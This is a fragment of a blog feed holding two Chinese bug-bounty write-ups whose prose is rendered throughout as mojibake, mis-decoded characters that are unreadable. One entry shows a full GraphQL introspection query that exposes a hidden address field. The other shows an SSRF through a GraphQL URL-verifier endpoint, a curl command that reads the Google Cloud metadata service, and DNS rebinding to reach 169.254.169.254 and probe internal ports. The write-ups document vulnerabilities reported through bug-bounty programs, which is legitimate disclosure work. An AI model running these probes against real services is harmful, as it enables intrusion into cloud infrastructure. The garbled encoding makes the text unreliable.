      <url>/2023/04/02/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81%E4%BA%8C-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%80%E7%BB%88%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84graphql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00 èµ·å› "></a>0x00 èµ·å› </h2><p>å‰å‡ æ—¥åœ¨hackeroneä¸ŠæŒ–æ˜æŸé«˜èµé‡‘å‚å•†ï¼Œèµ°äº†ä¸€éä¸šåŠ¡ç‚¹åï¼Œå¶ç„¶å‘ç°http historyé‡Œé¢æœ‰ä¸ªgraphqlçš„æ¥å£</p><p>äºæ˜¯ä¸€åœºåç‰¢ä¹‹æ—…å¼€å§‹äº†</p><h2 id="0x01-å‰ç½®çŸ¥è¯†ä¸å†…çœæŸ¥è¯¢"><a href="#0x01-å‰ç½®çŸ¥è¯†ä¸å†…çœæŸ¥è¯¢" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†ä¸å†…çœæŸ¥è¯¢"></a>0x01 å‰ç½®çŸ¥è¯†ä¸å†…çœæŸ¥è¯¢</h2><p>ä¸äº†è§£graphqlçš„å…„å¼Ÿå¯ä»¥çœ‹çœ‹å¦‚ä¸‹çš„å›¾</p><p>é€šä¿—æ˜“æ‡‚åœ°è¯´ï¼šGraphqlç±»ä¼¼äºrestfulçš„API å¼€æºæŸ¥è¯¢è¯­è¨€ï¼Œå…¶å·§å¦™çš„æ–°æ–¹æ³•æ¥æ”¹å–„åº”ç”¨ç¨‹åºä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’ï¼Œä¸ºé¡¹ç›®æ„å»ºå’ŒåæœŸç»´æŠ¤æä¾›äº†æ–°æ€è·¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231615.png" alt="image-20230316102800443"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231469.png" alt="image-20230316102729116"></p><p>åœ¨å®è·µç»éªŒä¸­ï¼Œå‘ç°å›½å†…ç”¨graphqlæŠ€æœ¯çš„å‚å•†å¹¶ä¸æ˜¯å¾ˆå¤šï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯åŸºäºrestfulçš„ï¼Œå›½å¤–æ¯”è¾ƒæµè¡Œ</p><p>åœ¨graphqlä¸­ï¼Œæ˜¯æ”¯æŒ<strong>â€œå†…çœæŸ¥è¯¢â€</strong>è¿™ç§æ¯”è¾ƒç‰¹æ®Šçš„æŠ€æœ¯çš„</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼ŒGraphQLå†…ç½®äº†<strong>ç±»ä¼¼äºâ€œswaggerçš„â€æ¥å£æ–‡æ¡£ï¼Œä½ å¯ä»¥é€šè¿‡å†…çœçš„æ–¹æ³•è·å¾—è¿™äº›ä¿¡æ¯ï¼Œå¦‚graphqlä¸­å¯¹è±¡å®šä¹‰ã€æ¥å£å‚æ•°ç­‰ä¿¡æ¯ã€‚</strong></p><p>å½“ä½¿ç”¨è€…ä¸çŸ¥é“æŸä¸ªGraphQLæ¥å£ä¸­çš„ç±»å‹å“ªäº›æ˜¯å¯ç”¨çš„ï¼Œå¯ä»¥é€šè¿‡__schemaå­—æ®µæ¥å‘GraphQLæŸ¥è¯¢å“ªäº›ç±»å‹æ˜¯å¯ç”¨çš„ã€‚</p><p>ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥é€šè¿‡__schemaé€šè¿‡æ­¤è‡ªçœåŠŸèƒ½äº†è§£æœ‰å…³æ¥å£ç±»å‹çš„æ›´å¤šä¿¡æ¯ã€‚(ä¸‹æ–¹å›¾æºäºé…’ä»™æ¡¥éƒ¨é˜Ÿçš„ä¸€ç¯‡æ–‡ç« )</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231604.png" alt="img"></p><p>è€Œå†…çœæŸ¥è¯¢é€šå¸¸æ˜¯ä¸åº”è¯¥å¯¹å¤–èƒ½ç›´æ¥ä½¿ç”¨çš„</p><h2 id="0x02-æŒ–æ˜è¿‡ç¨‹"><a href="#0x02-æŒ–æ˜è¿‡ç¨‹" class="headerlink" title="0x02 æŒ–æ˜è¿‡ç¨‹"></a>0x02 æŒ–æ˜è¿‡ç¨‹</h2><p>æœ‰äº†ä¸€å®šçš„å‰ç½®çŸ¥è¯†ï¼Œæˆ‘ä»¬æ¥çœ‹è¿™ä¸ªgraphqlçš„ç‚¹</p><p>ç¬”è€…åœ¨æŠ“åˆ°è¯¥å‚å•†æŸä¸ªgraphqlçš„æ¥å£å,å°è¯•ä½¿ç”¨_schemaå†…çœæŸ¥è¯¢æ¥è·å–æ¥å£çš„é¢å¤–ä¿¡æ¯</p><pre><code class="http">POST /web-stories-api/graphql HTTP/1.1Host: xxxxxxxxxxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/jsonContent-Length: 1531    &#123;&quot;query&quot;:&quot;query Query &#123;\n    __schema &#123;\n      queryType &#123; name &#125;\n      mutationType &#123; name &#125;\n      subscriptionType &#123; name &#125;\n      types &#123;\n        ...FullType\n      &#125;\n      directives &#123;\n        name\n        description\n        locations\n        args &#123;\n          ...InputValue\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n\n  fragment FullType on __Type &#123;\n    kind\n    name\n    description\n    fields(includeDeprecated: true) &#123;\n      name\n      description\n      args &#123;\n        ...InputValue\n      &#125;\n      type &#123;\n        ...TypeRef\n      &#125;\n      isDeprecated\n      deprecationReason\n    &#125;\n    inputFields &#123;\n      ...InputValue\n    &#125;\n    interfaces &#123;\n      ...TypeRef\n    &#125;\n    enumValues(includeDeprecated: true) &#123;\n      name\n      description\n      isDeprecated\n      deprecationReason\n    &#125;\n    possibleTypes &#123;\n      ...TypeRef\n    &#125;\n  &#125;\n\n  fragment InputValue on __InputValue &#123;\n    name\n    description\n    type &#123; ...TypeRef &#125;\n    defaultValue\n  &#125;\n\n  fragment TypeRef on __Type &#123;\n    kind\n    name\n    ofType &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n                ofType &#123;\n                  kind\n                  name\n                &#125;\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &#125;&quot;&#125;</code></pre><p>ç»“æœéå¸¸niceï¼Œå†…çœæŸ¥è¯¢åç›®æ ‡è¿”å›äº†æ¥å£çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231358.png" alt="image-20230401094521366"></p><p>ä½†æ˜¯ä»¥ä¸Šçš„æ•°æ®çœ‹èµ·æ¥æ¯”è¾ƒæ‚ä¹±æ— ç« ï¼Œå†³å®šä½¿ç”¨å†…çœæŸ¥è¯¢çš„å›¾å½¢åŒ–çš„è§£æåŠŸèƒ½</p><p><a href="https://apis.guru/graphql-voyager/">https://apis.guru/graphql-voyager/</a>  è¿™ä¸ªsiteä¸ºå†…çœæŸ¥è¯¢çš„JSON responseæä¾›äº†ä¸é”™çš„å›¾å½¢åŒ–è§£æ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231450.png" alt="image-20230401094819603"></p><p>è§£æåç»“æœå¦‚å›¾(æœ‰äº›å­—æ®µæ¶‰åŠå‚å•†åç§°ï¼Œæ‰“ç äº†)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231904.png" alt="image-20230401095109158"></p><p>è¯¥graphqlæ¥å£æ˜¯<strong>åŸºäºæŸä¸ªè·å–â€œç¤¾äº¤åˆ†äº«â€çš„ä¸šåŠ¡ç‚¹çš„</strong>ï¼Œæœ€ç»ˆæˆ‘åœ¨å›¾å½¢åŒ–çš„è§£æç»“æœä¸­å‘ç°ï¼š<strong>æŸä¸ªæŸ¥è¯¢å¯¹è±¡ä¸­æœ‰ä¸€ä¸ªå¹¶æ²¡æœ‰ç”¨åˆ°å®é™…ä¸šåŠ¡ä¸­çš„æ•æ„Ÿå‚æ•°â€œaddressâ€</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231802.png" alt="image-20230401095411362"></p><p>çœ‹åˆ°è¿™é‡Œï¼Œé¢…å†…é«˜æ½®ä¾¿èµ·æ¥äº†</p><p>ç›´æ¥æŠŠaddresså‚æ•°åŠ å…¥queryæŸ¥è¯¢é‡Œï¼Œæœ€ç»ˆæˆåŠŸå›æ˜¾å‡ºæ¥äº†ä¼—å¤šâ€œç¤¾äº¤åˆ†äº«â€ä¸­çš„address</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231393.png" alt="image-20230401100029460"></p><p>ä½†æ˜¯å¾ˆé—æ†¾ï¼Œ<strong>å¤§éƒ¨åˆ†addresséƒ½æ˜¯nullï¼Œæˆ–è€…æœ€é«˜ç²¾ç¡®åº¦åˆ°â€œé•‡çº§è¡Œæ”¿åŒºâ€çš„æ•°æ®ï¼Œæ²¡æœ‰è¯¦ç»†åˆ°èƒ½å‡ºå‘è¡¨ç¤¾äº¤ä¿¡æ¯äººçš„å…·ä½“ä½ç½®</strong></p><p>ä½†æ˜¯è¿˜æ˜¯å†³å®šè¯•ä¸€è¯•ï¼Œå‘xxå‚å•†å®‰å…¨å›¢é˜ŸæŠ¥å‘Šäº†è¿™ä¸ªé—®é¢˜</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231086.png" alt="image-20230401100539493"></p><p>å‚å•†å…ˆåå›å¤çš„æ„æ€å¤§æ¦‚æ˜¯è¯´ï¼Œ<strong>addressç­‰å­—æ®µè™½ç„¶åœ¨æ˜é¢çš„ä¸šåŠ¡è¯·æ±‚ä¸Šæ²¡å±•ç¤ºï¼Œä½†æ˜¯å¹¶ä¸å±äºç‰¹åˆ«æ•æ„Ÿçš„ä¿¡æ¯ï¼Œå¯¹ç”¨æˆ·æ•°æ®å®‰å…¨ä¸ä¼šäº§ç”Ÿå½±å“</strong></p><p><strong>å°½ç®¡å…³é—­è¿™ä¸ªgraphqlæ¥å£çš„å†…çœæŸ¥è¯¢ä¼šæ›´å®‰å…¨ï¼Œä½†æ˜¯æˆ‘ä»¬è®¤ä¸ºä¿ç•™graphqlå†…çœæŸ¥è¯¢è¿™ä¸ªfeatureä¼šè®©èœé¸¡çš„å®‰å…¨ç ”ç©¶äººå‘˜(æ¯”å¦‚ä½ )æ›´å®¹æ˜“æ‰¾åˆ°apiä¸­çš„æ¼æ´é—®é¢˜</strong></p><p><strong>æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶ä¸ä¼šä¿®æ”¹è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œè™½ç„¶æˆ‘ä»¬å¾ˆèµèµä½ èŠ±æ—¶é—´æ¥æäº¤æˆ‘ä»¬èµé‡‘é¡¹ç›®çš„é—®é¢˜</strong></p><h2 id="0x03-åè¨€"><a href="#0x03-åè¨€" class="headerlink" title="0x03 åè¨€"></a>0x03 åè¨€</h2><p>çœ‹åˆ°è¿™é‡Œï¼Œè™½ç„¶æœ‰äº›å¤±è½ï¼Œä½†æ˜¯ä¹Ÿæ— æ‰€è°“ï¼Œ<strong>åœ¨æ¯æ¬¡æ¼æ´æŒ–æ˜ä¸ç»éªŒçš„å­¦ä¹ çš„è¿‡ç¨‹ä¸­ä¸­ï¼Œæœ‰æ‰€ä¹ å¾—ï¼ˆæ— è®ºæ˜¯çŸ¥è¯†è¿˜æ˜¯ç»éªŒï¼‰æ‰æ˜¯å…³é”®æ‰€åœ¨</strong>ï¼Œè€Œæ¼æ´çš„æœ€ç»ˆæ•ˆæœå’Œäº§å‡ºå¾€å¾€æ˜¯å¤©æ³¨å®šï¼Œæˆ‘ä»¬å¼ºæ±‚ä¸æ¥</p><p><strong>è°åˆçŸ¥é“ä¸‹ä¸ªâ€å†…çœæŸ¥è¯¢â€ä¸ä¼šäº§å‡ºboomçº§åˆ«çš„ä¿¡æ¯å’Œæ¼æ´å‘¢</strong></p><p><strong>Hack to learn and learn to hackç¼ºä¸€ä¸å¯</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(åä¸€)-ä»å¿½ç•¥åˆ°triageå†åˆ°å¤±æœ›bountyçš„SSRFæŒ–æ˜ä¹‹æ—…</title>
      <link href="/2023/03/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81%E4%B8%80-%E4%BB%8E%E5%BF%BD%E7%95%A5%E5%88%B0triage%E5%86%8D%E5%88%B0%E5%A4%B1%E6%9C%9Bbounty%E7%9A%84SSRF%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/"/>
      <url>/2023/03/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81%E4%B8%80-%E4%BB%8E%E5%BF%BD%E7%95%A5%E5%88%B0triage%E5%86%8D%E5%88%B0%E5%A4%B1%E6%9C%9Bbounty%E7%9A%84SSRF%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-èµ·å› "><a href="#0x01-èµ·å› " class="headerlink" title="0x01 èµ·å› "></a>0x01 èµ·å› </h2><p>å‰ä¸¤å¤©å’Œæœ‹å‹èŠå¤©ï¼Œä»–å‘ç°äº†ä¸€å®¶åœ¨hackeroneä¸Šèµé‡‘é¢‡é«˜çš„Programï¼Œå¹¶ä¸”å‘ç°äº†å…¶ä¸­çš„æ¼æ´</p><p>è®©è€å¤«ç¾¡æ…•ä¸å·²</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228334.png" alt="image-20230316093850240"></p><p>å»hackeroneçœ‹äº†çœ‹å‚å•†ä¿¡æ¯ï¼Œæ¼æ´å¥–åŠ±ç¡®å®æ˜¯éå¸¸è¯±äººçš„</p><p>è€Œä¸”BugBounty Program Launched on Apr 2015â€¦.</p><p>8å¹´hackeroneçš„è€å‚å•†äº†ï¼Œä¸šåŠ¡ç‚¹æœ¬æ¥å°±ä¸å¤šï¼Œåˆè¢«ä¸–ç•Œå„å›½ç‰›é€¼çš„é»‘å®¢ä»¬æŒ–äº†å…«å¹´ï¼Œéš¾åº¦å¯æƒ³è€ŒçŸ¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228330.png" alt="image-20230316094052559"></p><p>ä½†æ˜¯ä¸ºäº†èµé‡‘è¿éš¾è€Œä¸Šï¼Œæ‰åº”è¯¥æ˜¯çœŸæ­£çš„æ¼æ´çŒäººè¯¥æœ‰çš„é£æ ¼ã€‚</p><h2 id="0x03-èµ°ä¸šåŠ¡ç‚¹ä¸‡å¿µä¿±ç°åˆ°å‘ç°æ•æ„Ÿè¯·æ±‚"><a href="#0x03-èµ°ä¸šåŠ¡ç‚¹ä¸‡å¿µä¿±ç°åˆ°å‘ç°æ•æ„Ÿè¯·æ±‚" class="headerlink" title="0x03 èµ°ä¸šåŠ¡ç‚¹ä¸‡å¿µä¿±ç°åˆ°å‘ç°æ•æ„Ÿè¯·æ±‚"></a>0x03 èµ°ä¸šåŠ¡ç‚¹ä¸‡å¿µä¿±ç°åˆ°å‘ç°æ•æ„Ÿè¯·æ±‚</h2><p>ä»Hackeroneçš„Program scopeä¸­æœé›†äº†ä¸€ä¸‹ä¸šåŠ¡ä¿¡æ¯ï¼Œè™½ç„¶å±•å¼€æµ‹è¯•</p><p>æµ‹è¯•äº†å¸¸è§„çš„ä¸€äº›WEBæ¼æ´ï¼ŒIDORç­‰æ¼æ´ï¼Œå‘ç°å®Œå…¨æ²¡æœ‰ä¸€ç‚¹æœºä¼šï¼ŒFilterå’Œé‰´æƒå†™çš„éå¸¸è¿‡ç¡¬ï¼Œè€Œä¸”ç”¨æˆ·éƒ½æ˜¯é€šè¿‡uuidç±»å‹æ¥ä¼ å‚è¿›è¡Œèº«ä»½é‰´æƒ</p><p>é¦–å…ˆç›®æ ‡æ²¡æœ‰IDORï¼Œå…¶æ¬¡å“ªæ€•æœ‰IDORä¹Ÿéå¸¸éš¾ä»¥åˆ©ç”¨</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228180.png" alt="image-20230316094832965"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228896.png" alt="image-20230316095041490"></p><p>ä»æ™šä¸Šä¹ç‚¹æµ‹åˆ°äº†ç¬¬äºŒå¤©å‡Œæ™¨ä¸¤ç‚¹ï¼Œå•¥ä¹Ÿæ²¡æµ‹å‡ºæ¥ï¼Œä¸‡å¿µä¿±ç°å‡†å¤‡æ´—æ´—ç¡äº†</p><p>ä½†æ˜¯å¿ƒæƒ³è¿˜æ˜¯çœ‹çœ‹Burpçš„HttpHistoryå§ï¼Œä¸‡ä¸€æœ‰è‡ªå·±æ²¡æ³¨æ„çš„æ•æ„Ÿè¯·æ±‚å‘¢</p><p>ç»“æœæ²¡æƒ³åˆ°ã€‚ã€‚ã€‚è¿˜çœŸå°±çœ‹åˆ°äº†ä¸€ä¸ªgraphqlçš„æ•æ„ŸæŸ¥è¯¢è¯·æ±‚</p><pre><code class="http">POST /agw/graphql?op=UrlReachableVerifierQuery&amp;client_trace_id=09bee58d-8358-4f00-acc0-8d26d0018d32,rst:1678201703792 HTTP/1.1Host: xxxxxCookie: xxxxUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonAuthorization: xxxxxContent-Length: 386Origin: https://xxxxxSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-siteTe: trailersConnection: close&#123;&quot;operationName&quot;:&quot;UrlReachableVerifierQuery&quot;,&quot;variables&quot;:&#123;&quot;url&quot;:&quot;http://xxxx.com/&quot;&#125;,&quot;query&quot;:&quot;query UrlReachableVerifierQuery($url: String!) &#123;\n  verifyUrlReachable(url: $url) &#123;\n    ... on UrlReachableResult &#123;\n      url\n       __typename\n    &#125;\n    ... on GenericError &#123;\n      errorCode\n      message\n      __typename\n    &#125;\n    __typename\n  &#125;\n&#125;\n&quot;&#125;</code></pre><p>urlåœ¨jsonä¸­ä¼ å‚ï¼Œæµ‹å•¥æ¼æ´ï¼Œæˆ‘æƒ³å¤§å®¶åº”è¯¥éƒ½æ‡‚</p><p>ç«‹é©¬ç”¨Burpçš„Collaboratoræµ‹è¯•dnslog</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228905.png" alt="image-20230316095750418"></p><p>æœä¸å…¶ç„¶ï¼Œæ”¶åˆ°äº†æ¥è‡ªä¸¤ä¸ªIPçš„Http Requestï¼Œä½†æ˜¯ç›®æ ‡çš„å›æ˜¾å°‘çš„å¯æ€œ</p><p>åªæœ‰urlï¼Œ__typenameä¸¤ä¸ªé”®çš„JSONè¿”å›äº†å›æ¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228999.png" alt="image-20230316100032084"></p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œä¸¤å°å‘é€è¯·æ±‚çš„æœåŠ¡å™¨éƒ½éƒ¨ç½²åœ¨GoogleCloudï¼Œç¬é—´å°±è®©äººå…´å¥‹äº†èµ·æ¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228570.png" alt="image-20230316100318112"></p><p>ä½†æ˜¯æƒ³äº†ä¸€ä¸‹åˆèäº†ï¼ŒGoogleCloud meta data(å…ƒæ•°æ®)çš„è·å–ä¸åƒå›½å†…çš„æŸæŸäº‘ï¼Œå…¶å¿…é¡»å¸¦æœ‰ç‰¹å®šçš„Header</p><p>è¿™ä¸ªSSRFç‚¹æ—¢æ²¡æœ‰å›æ˜¾ä¹Ÿæ²¡æ³•é€šè¿‡æ„é€ æ¶æ„é¡µé¢çš„jså‘é€å¸¦æœ‰headerçš„æ•°æ®ï¼ŒçœŸæ˜¯æ“è›‹</p><pre><code class="shell">request example:curl &quot;http://metadata.google.internal/computeMetadata/v1/instance/image&quot; -H &quot;Metadata-Flavor: Google&quot;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228658.png" alt="image-20230316100749756"></p><p>æ€å‰æƒ³åï¼Œå¯»æ€ä¹Ÿç®—ä¸ªç›²SSRFï¼Œå…ˆäº¤äº†å†è¯´</p><h2 id="0x04-ç§’å¿½ç•¥NoBugBountyåˆ°åˆ©ç”¨Graphqlå‘æ˜æ–°çš„æ”»å‡»é¢"><a href="#0x04-ç§’å¿½ç•¥NoBugBountyåˆ°åˆ©ç”¨Graphqlå‘æ˜æ–°çš„æ”»å‡»é¢" class="headerlink" title="0x04 ç§’å¿½ç•¥NoBugBountyåˆ°åˆ©ç”¨Graphqlå‘æ˜æ–°çš„æ”»å‡»é¢"></a>0x04 ç§’å¿½ç•¥NoBugBountyåˆ°åˆ©ç”¨Graphqlå‘æ˜æ–°çš„æ”»å‡»é¢</h2><p>äº¤å®Œè¿™ä¸ªç›²SSRFç‚¹ï¼Œç¡äº†ä¸€è§‰èµ·æ¥ï¼Œå‘ç°ç›´æ¥è¢«å‚å•†çš„å®‰å…¨å›¢é˜Ÿç»™å¿½ç•¥äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228020.png" alt="image-20230316101227267"></p><p>çœŸæ˜¯æ“è›‹ï¼Œç›²SSRFçœ‹æ ·ä¸å¤ªè¡Œï¼Œæ··ä¸åˆ°é’±ï¼Œæˆ‘ä»¬å¿…é¡»å¾—å‘æ˜æ–°çš„æ”»å‡»é¢</p><p>ï¼ˆä¸äº†è§£Graphqlçš„å…„å¼Ÿå¯ä»¥çœ‹ä¸‹ä¸‹é¢è¿™å¼ å›¾ï¼Œç”ŸåŠ¨åœ°è§£é‡Šäº†Restfulç±»å‹æ¥å£å’ŒGraphqlæ¥å£çš„åŒºåˆ«ï¼Œä¸Šæ–¹ä¸ºrestfulæ¥å£è¯·æ±‚æ ·å¼ï¼Œä¸‹æ–¹ä¸ºgraphqlçš„æ¥å£è¯·æ±‚æ ·å¼ï¼‰</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228916.png" alt="image-20230316102800443"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228031.png" alt="image-20230316102729116"></p><p>æ—¢ç„¶è¿™ä¸ªç‚¹æ˜¯åŸºäºGraphqlè¿›è¡ŒæŸ¥è¯¢çš„</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰æŸ¥è¯¢çš„column(param)ï¼Œå¦‚æœå­˜åœ¨è¯¥columnï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›è¿™ä¸ªå‚æ•°çš„æœ‰æ•ˆç»“æœï¼ŒäºŒè¯ä¸è¯´å¼€å§‹FUZZ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228743.png" alt="image-20230316102014491"></p><p>æœ€ç»ˆç»“æœè®©äººéå¸¸å¯’å¿ƒï¼Œå•¥å‹¾å…«ä¸œè¥¿ä¹Ÿæ²¡æœ‰(è¿™é‡Œå½“æ—¶çš„å›¾å¿˜å­˜äº†)</p><p>å†æ¬¡é™·å…¥ä¸‡å¿µä¿±ç°ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯ŸgraphqlæŸ¥è¯¢è¯·æ±‚çš„opå‚æ•°ï¼Œè®©æˆ‘æœ‰äº†ä¸€ç‚¹æƒ³æ³•</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228110.png" alt="image-20230316102242146"></p><p>opå­—æ®µä¸ºUrlReachableVerifierQueryï¼Œæˆ‘ä»¬ä¸ºå•¥ä¸è¯•è¯•æ‹¿ä»–å½“queryçš„columnå‘¢ï¼Ÿ</p><p>ç»“æœå‘ç°æµ‹è¯•åˆ°UrlReachableè¿™ä¸ªå­—æ®µæ—¶ï¼Œreponseä¸­å‡ºç°äº†æœ‰æ•ˆå›æ˜¾â€Reachableâ€</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228693.png" alt="image-20230316103133250"></p><p>niceï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ¥å£æ¥æ¢æµ‹å†…ç½‘ç«¯å£å¼€æ”¾æƒ…å†µäº†</p><p>æˆ‘ç›´æ¥ä½¿ç”¨GoogleCloudçš„meta dataåœ°å€æ¥æ¢æµ‹ç«¯å£è¿é€šæ€§</p><p>æ²¡æƒ³åˆ°ç›´æ¥å‘Šè¯‰æˆ‘äº†ä¸ªâ€Not_Reachableâ€ã€‚ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228129.png" alt="image-20230316103324813"></p><p>é‚£ä¹ˆå°±å¾—ç”¨ç‚¹æ–¹æ³•ç»•è¿‡äº†</p><h2 id="0x05-ç»•è¿‡SSRFé™åˆ¶æ¢æµ‹å†…ç½‘"><a href="#0x05-ç»•è¿‡SSRFé™åˆ¶æ¢æµ‹å†…ç½‘" class="headerlink" title="0x05 ç»•è¿‡SSRFé™åˆ¶æ¢æµ‹å†…ç½‘"></a>0x05 ç»•è¿‡SSRFé™åˆ¶æ¢æµ‹å†…ç½‘</h2><p>è¯•äº†è¯•302è·³è½¬ï¼ŒçŸ­è¿æ¥ç­‰æ–¹å¼ï¼Œéƒ½ä¸å¥½ä½¿</p><p>äºæ˜¯å¯„å‡ºdns rebinding</p><p>åœ¨ceyeä¸Šé…ç½®å¥½dns rebindingçš„IPåœ°å€<strong>ï¼ˆgoogleCloud meta dataçš„ipåœ°å€ä¸º169.254.169.254ï¼Œå€Ÿæ­¤æ¥éªŒè¯å†…ç½‘è¿é€šæ€§ï¼‰</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228629.png" alt="image-20230316103545120"></p><p>ç›´æ¥dns rebindingæ¥ç»•è¿‡SSRFé™åˆ¶</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228089.png" alt="image-20230316103640166"></p><p>å‘ç°æˆ‘ä»¬æˆåŠŸè·å¾—äº†â€œReachableâ€çš„ç»“æœï¼</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œæ¢æµ‹ç«¯å£è¿é€šæ€§</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228106.png" alt="image-20230316103901683"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228270.png" alt="image-20230316104112068"></p><p>80ç«¯å£reachableï¼Œå…¶ä»–ç«¯å£Not_Reachableï¼Œå·²ç»è¯æ˜äº†æ­¤å¤„SSRFå¯æ¢æµ‹å†…ç½‘</p><h2 id="0x06-å†æ¬¡æäº¤æ¼æ´åˆ°triageä¸bounty"><a href="#0x06-å†æ¬¡æäº¤æ¼æ´åˆ°triageä¸bounty" class="headerlink" title="0x06 å†æ¬¡æäº¤æ¼æ´åˆ°triageä¸bounty"></a>0x06 å†æ¬¡æäº¤æ¼æ´åˆ°triageä¸bounty</h2><p>å†æ¬¡æäº¤åæ¼æ´å¾—åˆ°äº†Triage</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228745.png" alt="image-20230316104214787"></p><p>triageçš„severityä¸ºmedium</p><p>æœ€ç»ˆbountyæŒ‰ç…§lowå‘çš„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228255.png" alt="image-20230331183101311"></p><p>ä»åœ¨äº¤æ¶‰ä¸­ï¼Œä¼°è®¡æ˜¯å¤§å†™çš„å¯„</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(å)-è®°ä¸€æ¬¡å±‚å±‚çªç ´çš„æ”»é˜²æ¼”ç»ƒ</title>
